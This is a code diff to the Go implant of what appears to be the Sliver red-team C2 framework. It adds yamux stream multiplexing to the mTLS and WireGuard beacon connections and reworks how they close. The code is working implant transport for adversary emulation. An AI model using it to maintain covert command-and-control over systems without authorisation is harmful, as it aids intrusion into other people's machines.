@@ -36,6 +36,11 @@ import (
 
 	// {{end}}
 
+	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
+	"github.com/hashicorp/yamux"
+
+	// {{end}}
+
 	// {{if .Config.IncludeHTTP}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	// {{end}}
@@ -192,6 +197,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 	}
 
 	var conn *tls.Conn
+	var muxSession *yamux.Session
 	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
@@ -202,15 +208,38 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 			if err != nil {
 				return err
 			}
+			if _, err := conn.Write([]byte(mtls.YamuxPreface)); err != nil {
+				_ = conn.Close()
+				return err
+			}
+			muxSession, err = yamux.Client(conn, nil)
+			if err != nil {
+				_ = conn.Close()
+				return err
+			}
 			return nil
 		},
 		Recv: func() (*pb.Envelope, error) {
-			return mtls.ReadEnvelope(conn)
+			stream, err := muxSession.Accept()
+			if err != nil {
+				return nil, err
+			}
+			defer stream.Close()
+			return mtls.ReadEnvelope(stream)
 		},
 		Send: func(envelope *pb.Envelope) error {
-			return mtls.WriteEnvelope(conn, envelope)
+			stream, err := muxSession.Open()
+			if err != nil {
+				return err
+			}
+			defer stream.Close()
+			return mtls.WriteEnvelope(stream, envelope)
 		},
 		Close: func() error {
+			if muxSession != nil {
+				_ = muxSession.Close()
+				muxSession = nil
+			}
 			if conn != nil {
 				err = conn.Close()
 				if err != nil {
@@ -242,6 +271,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 
 	var conn net.Conn
 	var dev *device.Device
+	var muxSession *yamux.Session
 	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
@@ -260,25 +290,48 @@ func wgBeacon(uri *url.URL) *Beacon {
 			if err != nil {
 				return err
 			}
+			if _, err := conn.Write([]byte(wireguard.YamuxPreface)); err != nil {
+				_ = conn.Close()
+				_ = dev.Down()
+				return err
+			}
+			muxSession, err = yamux.Client(conn, nil)
+			if err != nil {
+				_ = conn.Close()
+				_ = dev.Down()
+				return err
+			}
 			return nil
 		},
 		Recv: func() (*pb.Envelope, error) {
-			return wireguard.ReadEnvelope(conn)
+			stream, err := muxSession.Accept()
+			if err != nil {
+				return nil, err
+			}
+			defer stream.Close()
+			return wireguard.ReadEnvelope(stream)
 		},
 		Send: func(envelope *pb.Envelope) error {
-			return wireguard.WriteEnvelope(conn, envelope)
+			stream, err := muxSession.Open()
+			if err != nil {
+				return err
+			}
+			defer stream.Close()
+			return wireguard.WriteEnvelope(stream, envelope)
 		},
 		Close: func() error {
-			err = conn.Close()
-			if err != nil {
-				return err
+			if muxSession != nil {
+				_ = muxSession.Close()
+				muxSession = nil
 			}
-			err = dev.Down()
-			if err != nil {
-				return err
+			if conn != nil {
+				_ = conn.Close()
+				conn = nil
 			}
-			conn = nil
-			dev = nil
+			if dev != nil {
+				_ = dev.Down()
+				dev = nil
+			}
 			return nil
 		},
 		Cleanup: func() error {
